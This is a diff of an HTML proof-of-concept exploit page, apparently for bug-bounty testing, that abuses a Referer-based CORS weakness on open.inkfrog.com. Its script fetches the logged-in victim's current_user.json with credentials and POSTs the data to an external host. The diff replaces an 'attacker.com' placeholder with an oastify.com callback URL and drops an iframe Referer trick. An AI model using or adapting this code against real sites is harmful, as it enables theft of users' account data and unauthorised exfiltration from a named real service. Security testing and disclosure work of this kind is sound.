@@ -4,17 +4,10 @@
   <title>CORS Referer Exploit - open.inkfrog.com</title>
 </head>
 <body>
-  <h2>🔓 Exfiltrating current_user.json from open.inkfrog.com</h2>
+  <h2>🔥 Exploiting Referer-Based CORS on open.inkfrog.com</h2>
   <pre id="output">Loading...</pre>
 
   <script>
-    // Force the browser to send the correct Referer
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = "https://builder.asd.com"; // page must exist or redirect
-
-    document.body.appendChild(iframe);
-
     setTimeout(() => {
       fetch("https://open.inkfrog.com/api/current_user.json", {
         credentials: "include"
@@ -26,16 +19,17 @@
       .then(data => {
         document.getElementById("output").textContent = data;
 
-        // Optional: Exfil to attacker server
-        fetch("https://attacker.com/log", {
+        // Optional: exfil to external server
+        fetch("https://kc04vgr52i5539r3sviple5g076yuxim.oastify.com/log", {
           method: "POST",
           body: data
         });
       })
       .catch(err => {
         document.getElementById("output").textContent = "Error: " + err;
+        console.error(err);
       });
-    }, 1500); // Delay to allow Referer to register
+    }, 2000); // Wait 2 seconds to ensure proper Referer
   </script>
 </body>
 </html>
